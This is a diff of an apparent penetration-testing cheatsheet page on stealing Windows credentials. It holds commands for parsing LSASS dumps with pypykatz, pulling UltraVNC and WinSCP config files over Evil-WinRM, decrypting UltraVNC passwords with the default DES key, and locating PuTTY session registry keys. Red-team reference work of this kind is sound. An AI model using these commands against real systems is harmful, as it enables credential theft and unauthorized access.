@@ -1,10 +1,10 @@
 ---
 layout: post
-title: TA0006 Windows - Credentials Steal 
+title: TA0006 Credentials Steal - Windows
 category: pen
 parent: cheatsheets
 modified_date: 2023-06-08
-permalink: /pen/credssteal/win
+permalink: /pen/creds/win
 ---
 
 **Mitre Att&ck Entreprise**: [TA0006 - Credentials Access](https://attack.mitre.org/tactics/TA0006/)
@@ -74,6 +74,12 @@ pypykatz lsa minidump lsass.dmp -k /tmp/krb > output.txt
 ### <a name='sam'></a>sam
 - [registry & vss](https://nored0x.github.io/red-teaming/Windows-Credentials-SAM-Database-part-1/)
 
+## regkeys
+[T1552.002](https://attack.mitre.org/techniques/T1552/002/)
+```sh
+Software\SimonTatham\Putty\Sessions
+```
+
 ## <a name='schtasks'></a>schtasks
 
 ## <a name='softwares'></a>softwares
@@ -107,7 +113,7 @@ pypykatz lsa minidump lsass.dmp -k /tmp/krb > output.txt
 | UltraVNC | | C:\Program Files\uvnc bvba\UltraVNC\ultravnc.ini |
 
 * Example of download of the ini file:
-```
+```sh
 Evil-winRM > download "C:\Program Files\uvnc bvba\UltraVNC\ultravnc.ini" /tmp/ultravnc.ini
 ```
 
@@ -115,7 +121,7 @@ Evil-winRM > download "C:\Program Files\uvnc bvba\UltraVNC\ultravnc.ini" /tmp/ul
 
 passwd - full control password
 passwd2 - read-only password
-```
+```sh
 # des decryption using the ultravnc default decryption key 'e84ad660c4721ae0' 
 echo -n passwd | xxd -r -p | openssl enc -des-cbc --nopad --nosalt -K e84ad660c4721ae0 -iv 0000000000000000 -d -provider legacy -provider default | hexdump -Cv
 
@@ -130,7 +136,7 @@ vncsnapshot 1.2.3.4 pwned_desktop_x.png
 * Check if there are saved passwords
 * Export the configuration
 * Download of the ini file:
-```
+```sh
 Evil-winRM > download "C:\Windows\Temp\winscp.ini" /tmp/winscp.ini
 ```
 
